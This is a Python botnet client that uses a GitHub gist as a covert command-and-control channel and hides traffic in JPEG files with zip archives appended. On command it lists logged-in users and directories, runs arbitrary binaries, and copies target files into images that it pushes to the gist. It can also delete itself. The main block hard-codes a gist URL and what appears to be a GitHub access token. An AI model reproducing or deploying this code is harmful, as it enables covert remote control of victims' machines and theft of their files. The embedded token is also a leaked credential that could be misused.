import os
import time
import names
from random import randint

from git import Git


class Bot:
    """
            # Bot client class.
    """
    def __init__(self, botdir):
        """
        :param botdir: directory of gist.github repository.
        """
        self.botname = names.get_first_name() + str(randint(1, 100))  # Generate name  of the bot.
        self.botdir = botdir

    @staticmethod
    def get_logged_users():
        """
        Method to get list of logged user on infected computer.
        :return: List of logged users.
        """
        users = os.popen("ps au | awk '{print $1}' | uniq").readlines()[1:]
        return set(map(lambda x: x[:-1], users))

    @staticmethod
    def list_dir(path, ps=""):
        """
        Method to get list of files and folders of particular directory.
        :param path: path of directory to be examined.
        :param ps: "" ~ "ls", "-a" ~ "ls -a"
        :return: list of files and folders of directory.
        """
        files = os.listdir(path)
        if ps == "-a":
            return files
        return list(filter(lambda x: x[0] != '.', files))

    @staticmethod
    def execute_binary(bname):
        """
        Run binary of given name.
        :param bname: name (or path with name) of binary to be run.
        """
        os.system(bname)

    def decode_file(self):
        """
        Decodes image rcved from C&C into image and file.
        Encoded file C&C-->bot 'tower.jpeg', product is tower.txt.
        """
        os.system("unzip " + self.botdir + "/tower.jpeg &> /dev/null")

    def encode_file(self, filename):
        """
        Encodes given file into image.
        Encoded file bot->C&C 'knight_<botname>.jpeg'.
        Empty image is always 'horse.jpeg'.
        :param filename: filename to be encoded.
        """
        os.system("zip -r tmp.zip " + filename)
        os.system("cat " + self.botdir + "/horse.jpeg tmp.zip > " + self.botdir +
                  "/knight_" + self.botname + ".jpeg")
        os.system("rm tmp.zip")

    def data2knight(self, data):
        """
        Converts list of data into file and calls image-encoding function.
        :param data: list of data: [cmd type, current id, msg string].
        """
        os.system("touch knight.txt")
        bot_file = open("knight.txt", 'w')
        bot_file.writelines("%s\n" % line for line in data)  # Write msg to txt file.
        bot_file.close()
        self.encode_file("knight.txt")  # Encode txt file into image.
        os.system("rm knight.txt")

    def copy2bishop(self, filename):
        """
        Encode given file into image.
        Encoded file bot->C&C 'bishop_<botname>.jpeg'.
        Empty image is always 'bishop.jpeg'
        :param filename: file to be sent.
        """
        os.system("cp " + filename + " " + os.path.basename(filename))
        filename = os.path.basename(filename)
        os.system("zip -r tmp.zip " + filename)
        os.system("cat " + self.botdir + "/bishop.jpeg tmp.zip > " + self.botdir +
                  "/bishop_" + self.botname + ".jpeg")
        os.system("rm tmp.zip " + filename)


def main(bot_dir, token, url):
    """
    Main function of Bot client.
    :param bot_dir: directory of gist.github repository.
    :param token: token of github account.
    :param url: url to gist.github repository.
    """

    communication = Git(token, url, bot_dir)  # Establish communication.
    communication.clone()  # Clone gist.github repository.
    bot = Bot(bot_dir)  # Establish Bot client.

    # Write bot's name into list of players and append player's rank in a game.
    player_list_msg = bot.botname + " playerRank: " + str(randint(1, 100)) + '\n'
    f = open(bot_dir + "/PlayersList.txt", "a")
    f.writelines(player_list_msg)
    f.close()
    communication.push("PlayersList.txt")  # Update PlayersList.txt.

    last_command_id = -1
    while True:  # Main loop.

        communication.pull()  # Download actual version of repository.

        # Check if PlayersList is empty. If yes, than terminate bot.
        f = open(bot_dir + "/PlayersList.txt")
        lines = f.readlines()
        if not lines:
            os.system("rm -rf " + bot_dir)
            f.close()
            break
        f.close()

        # Check if is available new tower.jpeg image from C&C server.
        if 'tower.jpeg' in os.listdir(bot_dir):
            bot.decode_file()  # Decode C&C image.
            cc_file = open("tower.txt", 'r')
            cmds = cc_file.readlines()  # 0 ~ botname, 1 ~ cmd id, 2 ~ cmd type, 3 ~ cmd param
            cc_file.close()
            os.system("rm tower.txt")

            # Check if the image is addressed to that bot (C&C sends images as broadcast).
            if cmds[0][:-1] == bot.botname:

                # Delete image with msg.
                os.system("cd " + bot_dir + "; git rm tower.jpeg &> /dev/null")
                communication.push_all()  # Actualise repo.

                curr_id = int(cmds[1][:-1])
                if last_command_id + 1 == curr_id:  # Check if the msg is actual.
                    cmd = int(cmds[2][:-1])
                    if cmd == 1:  # The task is to find logged users.
                        data = ["1", str(curr_id)] + list(bot.get_logged_users())  # Create return msg.
                        bot.data2knight(data)  # Encode msg to img.
                    if cmd in [2, 21]:  # The task is to list directory.
                        target_dir = cmds[3][:-1]
                        if cmd == 2:  # ls
                            data = ["2", str(curr_id)] + bot.list_dir(target_dir)
                        else:  # ls -a
                            data = ["2", str(curr_id)] + bot.list_dir(target_dir, "-a")
                        bot.data2knight(data)  # Encode msg to img.
                    if cmd == 3:  # The task is to run a binary.
                        target = cmds[3][:-1]
                        bot.execute_binary(target)  # Execute binary.
                        data = ["3", str(curr_id), "command to run " + target + " given"]
                        bot.data2knight(data)  # Encode msg to img.
                    if cmd == 4:  # The task is to copy a file.
                        target = cmds[3][:-1]
                        bot.copy2bishop(target)  # Copy target file to bishop image.
                        communication.push("bishop_" + bot.botname + ".jpeg")  # Send bishop to gist.
                    if cmd == 5:  # The task is to get current user's uid.
                        uid = os.geteuid()  # Get uid.
                        bot.data2knight(["5", str(curr_id), "current user's uid: " + str(uid)])

                    if cmd != 4:
                        communication.push("knight_" + bot.botname + ".jpeg")  # Send to gist.

                    # Increment last cmd id.
                    last_command_id += 1

        time.sleep(3)  # Sleep for 3s to avoid collisions and overloading.


if __name__ == '__main__':
    main("dcf75fc08e5970c9e103a885d95fa8e6",
         "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",
         "https://gist.github.com/dcf75fc08e5970c9e103a885d95fa8e6.git")
